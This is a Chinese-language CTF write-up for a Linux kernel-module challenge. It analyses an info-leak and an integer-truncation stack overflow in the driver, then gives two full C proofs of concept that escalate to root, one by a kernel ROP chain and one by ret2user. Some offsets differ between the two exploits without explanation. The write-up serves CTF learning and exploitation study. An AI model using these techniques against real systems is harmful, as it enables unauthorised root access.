[toc]

# 程序流程分析

## `core_ioctl`

`io_ctl`函数负责处理驱动对系统操作的响应流程，源码如下：

```c
_int64 __fastcall core_ioctl(__int64 a1, int switch_index, __int64 in_arg)
{
  __int64 in_arg_1; // rbx

  in_arg_1 = in_arg;
  switch ( switch_index )
  {
    case 0x6677889B:
      core_read(in_arg);
      break;
    case 0x6677889C:
      printk(&unk_2CD);                         // core: %d
      off = in_arg_1;
      break;
    case 0x6677889A:
      printk(&unk_2B3);
      core_copy_func(in_arg_1);
      break;
  }
  return 0LL;
}
```

`core_ioctl`函数根据传入参数的不同分为三个处理流程，分别为读取、修改偏移`off`和内存拷贝三个功能。

## `core_read`

`core_read`函数读取内核固定大小的内存内容传输至用户态的缓冲区中：

```c
unsigned __int64 __fastcall core_read(_QWORD *a1)
{
  _QWORD *user_buffer; // rbx
  __int64 v2; // rdi
  signed __int64 i; // rcx
  unsigned __int64 result; // rax
  __int64 kernel_buffer; // [rsp+0h] [rbp-50h]
  unsigned __int64 canary; // [rsp+40h] [rbp-10h]

  user_buffer = a1;
  canary = __readgsqword(0x28u);
  printk(&unk_25B);                             // core: called core_read
  printk(&unk_275);                             // %d %p
  v2 = (__int64)&kernel_buffer;
  for ( i = 16LL; i; --i )                      // 清空user_buffer
  {
    *(_DWORD *)v2 = 0;
    v2 += 4LL;
  }
  strcpy((char *)&kernel_buffer, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(user_buffer, (char *)&kernel_buffer + off, 0x40LL);// 地址泄露，绕过地址随机化
                                                // 
  if ( !result )
    return __readgsqword(0x28u) ^ canary;
  __asm { swapgs }
  return result;
}
```

在调用`copy_to_user`时，偏移`off`是可控的，且程序对`off`没有进行校验和限制，因此可实现任意地址读。将`off`设置40，即从`kernel_buffer+0x40`的位置开始读取，可泄露函数`canary`信息，为后续栈溢出做准备。

## `core_write`

该函数的作用为将用户缓冲区`Buffer`写入内核缓冲区`kernel_recv_buffer`中，唯一的限制条件为`size<0x800`：

```c
signed __int64 __fastcall core_write(__int64 a1, _QWORD *Buffer, unsigned __int64 copy_size_1)
{
  unsigned __int64 copy_size; // rbx

  copy_size = copy_size_1;
  printk(&unk_215);                             // core: called core_writen
  if ( copy_size <= 0x800 && !copy_from_user(&kernel_recv_buffer, Buffer, copy_size) )// copy_from_user
    return (unsigned int)copy_size;
  printk(&unk_230);                             // core: error copying data from userspacen
  return 0xFFFFFFF2LL;
}
```

## `core_copy_func`

该函数将`kernel_recv_buffer`中的内容传输至内核栈上的缓冲区中：

```c
signed __int64 __fastcall core_copy_func(signed __int64 size)
{
  signed __int64 result; // rax
  __int64 stack_buffer; // [rsp+0h] [rbp-50h]
  unsigned __int64 canary; // [rsp+40h] [rbp-10h]

  canary = __readgsqword(0x28u);
  printk(&unk_215);
  if ( size > 63 )                              // size < 63
                                                // size 可小于0
  {
    printk(&unk_2A1);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(&stack_buffer, &kernel_recv_buffer, (unsigned __int16)size);// 切换为unsigned
  }
  return result;
}
```

传入的参数为`int64`，但判断`size`时没有小于`0`的检验；在调用`qmemcpy`时，将`size`参数转换为了`int16`，将发生截断。因此可以传入负数值来绕过校验，如`0xffffff99`，后续类型转换传入`qmemcpy`的长度被截断为`0x99`，引发内核栈溢出。

从静态分析看，程序的漏洞利用点为任意地址读+栈溢出。

# 利用思路-ROP

## 利用原理

在`Linux`系统中，内核态与用户态相互隔离，在进行状态切换时需要保存寄存器信息；将用户提权到`root`，需要执行`commit_creds(prepare_kernel_cred(0))`函数；因此进行栈溢出构造`ROP`的思路为：

```
保存用户态寄存器状态
获取Canary值
获取系统函数偏移
获取gadget地址
执行栈溢出
劫持控制流，执行commit_creds(prepare_kernel_cred(0))
执行系统调用（如system("/bin/sh"))
完成提权
```

构造的`ROP`链大致如下：

```
+-------------------------------+
|       pop %rdi; ret           |
+-------------------------------+
|              NULL             | <= prepare_kernel_cred参数
+-------------------------------+
| addr of prepare_kernel_cred() |
+-------------------------------+
|      mov %rdi, %rax; ret      | <= 将返回值传入rdi
+-------------------------------+
|     addr of commit_creds()    |
+-------------------------------+
|              ...              |
+-------------------------------+
|            get_shell          |
+-------------------------------+
|              ...              |
+-------------------------------+

```

## 栈数据泄露

解包并修改`.gpio`文件中的`init`文件，将`setuidgid `设为0；修改`start.sh`，关闭`kaslr`。系统启动后，通过读取`kallsyms`中`startup_64`一项获取内核的基址：

```shell
/ # cat /tmp/kallsyms | grep startup_64
ffffffff81000000 T startup_64
ffffffff81000030 T secondary_startup_64
ffffffff810001f0 T __startup_64
```

读取`prepare_kernel_credit`与`commit_credits`的地址，计算其与内存基址的偏移：

```shell
/ # cat /tmp/kallsyms | grep prepare_kernel_cred
ffffffff8109cce0 T prepare_kernel_cred # kernel_base+0x9cce0

/ # cat /tmp/kallsyms | grep commit_creds
ffffffff8109c8e0 T commit_creds #kernel_base+0x9c8e0
```

通过`lsmod`获取模块基址：

```shell
/ # lsmod
core 16384 0 - Live 0xffffffffc0000000
```

执行`copy_to_user`前，内核栈数据如下：

```shell
pwndbg> x /10s $rsi-0x40 #内核栈数据
0xffffc90000123e18:     "Welcome to the QWB CTF challenge.\n"
0xffffc90000123e3b:     ""
0xffffc90000123e3c:     ""
0xffffc90000123e3d:     ""
0xffffc90000123e3e:     ""
0xffffc90000123e3f:     ""
0xffffc90000123e40:     ""
0xffffc90000123e41:     ""
0xffffc90000123e42:     ""
0xffffc90000123e43:     ""
pwndbg> x /10gx $rsi-0x40
0xffffc90000123e18:     0x20656d6f636c6557      0x5120656874206f74
0xffffc90000123e28:     0x6320465443204257      0x65676e656c6c6168
0xffffc90000123e38:     0x0000000000000a2e      0x0000000000000000
0xffffc90000123e48:     0x0000000000000000      0x0000000000000000
0xffffc90000123e58:     0x571520a109a39a00      0x00007ffed993f630

pwndbg> x /10gx $rsi
0xffffc90000123e68:     0xffffffffc000019b      0xffff88000f449a80
0xffffc90000123e78:     0xffffffff811dd6d1      0x000000000000889b
0xffffc90000123e88:     0xffff88000f479400      0xffffffff8118ecfa
0xffffc90000123e98:     0xffffc90000123e70      0x0000000000000012
0xffffc90000123ea8:     0x0000000000000002      0xffffffff82256968
```

执行`copy_to_user`泄露栈数据后，接收的缓冲区内容为：

```c
pwndbg> x /10gx $rbx
0x7ffed993f630: 0x571520a109a39a00      0x00007ffed993f630
0x7ffed993f640: 0xffffffffc000019b      0xffff88000f449a80
0x7ffed993f650: 0xffffffff811dd6d1      0x000000000000889b
0x7ffed993f660: 0xffff88000f479400      0xffffffff8118ecfa
0x7ffed993f670: 0x0000000000000000      0x0000000000000000
```

`rbx`为缓冲区的基址，取`buffer+0x20`处内容`0xffffffff811dd6d1`，减去`0x1dd6d1`即为内核基址；取`buffer+10`处内容`0xffffffffc000019b-0x19b`为驱动基址。

利用`ROPgadget`查找`gadget`，并计算`gadget`与内核基址的偏移：

```shell
 ROPgadget --binary vmlinux > gadget.txt
 
 #gadget.txt
 
 0xffffffff81000b2f : pop rdi ; ret # kernel_base+0xb2f
 0xffffffff810a0f49 : pop rdx ; ret # kernel_base+0xa0f49
 0xffffffff81021e53 : pop rcx ; ret # kernel_base+0x21e53
 0xffffffff8101aa6a : mov rdi, rax ; call rdx # kernel_base+0x1aa6a
 
 objdump -d vmlinux -M intel  | grep -E "iretq|ret" > gad.txt
 ffffffff8105d32c:	48 cf                	iretq  
 ffffffff8105d33e:	c3                   	ret    
```

## 构造ROP

综合以上信息，构造`ROP`链的内容如下：

```c
	for(i = 0;i < 8;i++)
	{
        rop[i] = 0x66666666;  <= 0x40
    } 
    rop[i++] = canary;                      //canary
    rop[i++] = 0;                           //rbp(junk)
    rop[i++] = vmlinux_base + 0xb2f;        //pop_rdi_ret;
    rop[i++] = 0;                           //rdi
    rop[i++] = prepare_kernel_cred_addr;
    rop[i++] = vmlinux_base + 0xa0f49;      //pop_rdx_ret <= ret调用后，栈上的内容作为返回参数弹出（函数不会修改栈上内容），RIP至该地址
    rop[i++] = vmlinux_base + 0x21e53;      //pop_rcx_ret <= cred_addr返回后的RSP
    rop[i++] = vmlinux_base + 0x1aa6a;      //mov_rdi_rax_call_rdx => 跳转回vmlinux_base + 0x21e53
    rop[i++] = commit_creds_addr;           //  <= 执行pop_rcx_ret时的RSP 
    rop[i++] = core_base + 0xd6;            //swapgs;pop_rbp;ret
    rop[i++] = 0;                           //rbp(junk)
    rop[i++] = vmlinux_base + 0x50ac2;     //iretq_ret
    rop[i++] = (size_t)shell; //user_rip
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
```

全部`POC`如下：

```c
//rop.c
//gcc rop.c -o poc -w -static
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int fd;
void core_read(char *buf){
    ioctl(fd,0x6677889B,buf);
    //printf("[*]The buf is:%x\n",buf);
}

void change_off(long long v1){
    ioctl(fd,0x6677889c,v1);
}

void core_write(char *buf,int a3){
    write(fd,buf,a3);
}

void core_copy_func(long long size){
    ioctl(fd,0x6677889a,size);
}

void shell(){//get_shell函数
    system("/bin/sh");
}

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats(){//存储用户态寄存器内容
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

int main(){
    int ret,i;
    char buf[0x100];
    size_t vmlinux_base,core_base,canary;
    size_t commit_creds_addr,prepare_kernel_cred_addr;
    size_t commit_creds_offset = 0x9c8e0;
    size_t prepare_kernel_cred_offset = 0x9cce0;
    size_t rop[0x100];
    save_stats();
    fd = open("/proc/core",O_RDWR);
    change_off(0x40);
    core_read(buf);
    /*
    for(i=0;i<0x40;i++){
    printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&buf[i]));
    }
    */
    vmlinux_base = *(size_t *)(&buf[0x20]) - 0x1dd6d1;//通过关闭kaslr+root登陆获取偏移，下同
    core_base = *(size_t *)(&buf[0x10]) - 0x19b;
    prepare_kernel_cred_addr = vmlinux_base + prepare_kernel_cred_offset;
    commit_creds_addr = vmlinux_base + commit_creds_offset;
    canary = *(size_t *)(&buf[0]);
    printf("[*]canary:%p\n",canary);
    printf("[*]vmlinux_base:%p\n",vmlinux_base);
    printf("[*]core_base:%p\n",core_base);
    printf("[*]prepare_kernel_cred_addr:%p\n",prepare_kernel_cred_addr);
    printf("[*]commit_creds_addr:%p\n",commit_creds_addr);
    //junk
    for(i = 0;i < 8;i++){
        rop[i] = 0x66666666;                //0x40
    }
    rop[i++] = canary;                      //canary
    rop[i++] = 0;                           //rbp(junk)
    rop[i++] = vmlinux_base + 0xb2f;        //pop_rdi;ret;
    rop[i++] = 0;                           //rdi
    rop[i++] = prepare_kernel_cred_addr;
    rop[i++] = vmlinux_base + 0xa0f49;      //pop_rdx;ret <= ret调用后，栈上的内容作为返回参数弹出（函数不会修改栈上内容），RIP至该地址
    rop[i++] = vmlinux_base + 0x21e53;      //pop_rcx;ret <= cred_addr返回后的RSP
    rop[i++] = vmlinux_base + 0x1aa6a;      //mov_rdi_rax;call_rdx => 跳转回vmlinux_base + 0x21e53，压栈RIP的下一条指令vmlinux_base + 0x1aa6f
    rop[i++] = commit_creds_addr;
    rop[i++] = core_base + 0xd6;            //swapgs;pop_rbp;ret
    rop[i++] = 0;                           //rbp(junk)
    //rop[i++] = vmlinux_base + 0x50ac2;      //iretq_ret
    rop[i++] = vmlinux_base + 0x5d32c;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    core_write(rop,0x100);
    core_copy_func(0xf000000000000100);
    return 0;
}

```

# 利用思路-ret2user

使用`cat /proc/cpuinfo`命令观察内核保护：

```bash
flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm nopl cpuid pni cx16 hypervisor lahf_lm svm 3dnowprefetch vmmcall
```

可以看到没有开启`smep`和`smap`，意味着内核栈中可以直接执行用户态中的函数，与之前的`ROP`利用思路相比，`ret2user`的思路更加简单，不需要在内核中寻找函数偏移和`gadget`来执行提权操作，直接在程序中定义提权与`shell`函数，在栈溢出时构造返回地址即可：

```c
void payload(){
      commit_creds(prepare_kernel_cred(0));
}
unsigned long long rop[0x30];

	rop[8] = canary ; 
	rop[10] = payload; //用户态函数地址
	rop[11] = swapgs;  //swapgs;pop_rbp;ret
	rop[12] = 0;
	rop[13] = iretq ;
	rop[14] = get_shell ;//用户态get_shell地址 
	rop[15] = user_cs;
	rop[16] = user_eflags;
	rop[17] = user_sp;
	rop[18] = user_ss;
	rop[19] = 0;
```

完整`poc`如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(void){
    system("/bin/sh");
}
//eip =(unsigned long long) get_shell;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void payload(){
      commit_creds(prepare_kernel_cred(0));
}

void setoff(int fd,int off){
	ioctl(fd,0x6677889C,off);
}

void core_read(int fd,char *buf){
	ioctl(fd,0x6677889B,buf);
}

void core_copy(int fd , unsigned long long len){
	ioctl(fd, 0x6677889A,len);
}

int main(void){
	save_stats() ; 
	unsigned long long buf[0x40/8];
	memset(buf,0,0x40);
	unsigned long long canary ;
	unsigned long long module_base ;
	unsigned long long vmlinux_base ; 
	unsigned long long iretq ;
	unsigned long long swapgs ;
	unsigned long long rop[0x30];
	memset(buf,0,0x30*8);
	int fd = open("/proc/core",O_RDWR);
	if(fd == -1){
		printf("open file error\n");
		exit(0);
	}
	else{
		printf("open file success\n");
	}
	printf("[*] buf: 0x%p",buf);
	setoff(fd,0x40);
	core_read(fd,buf);
	canary = buf[0];
	module_base =  buf[2] - 0x19b;
	vmlinux_base = buf[4] - 0x16684f0;
	printf("[*] canary: 0x%p",canary);
	printf("[*] module_base: 0x%p",module_base);
	printf("[*] vmlinux_base: 0x%p",vmlinux_base);
	commit_creds = vmlinux_base + 0x9c8e0;
	prepare_kernel_cred = vmlinux_base + 0x9cce0;
	iretq = vmlinux_base + 0x50ac2;
	swapgs  = module_base + 0x0d6;
	rop[8] = canary ; 
	rop[10] = payload;
	rop[11] = swapgs;
	rop[12] = 0;
	rop[13] = iretq ;
	rop[14] = get_shell ; 
	rop[15] = user_cs;
	rop[16] = user_eflags;
	rop[17] = user_sp;
	rop[18] = user_ss;
	rop[19] = 0;
	write(fd,rop,0x30*8);
	core_copy(fd,0xf000000000000000+0x30*8);
}

```







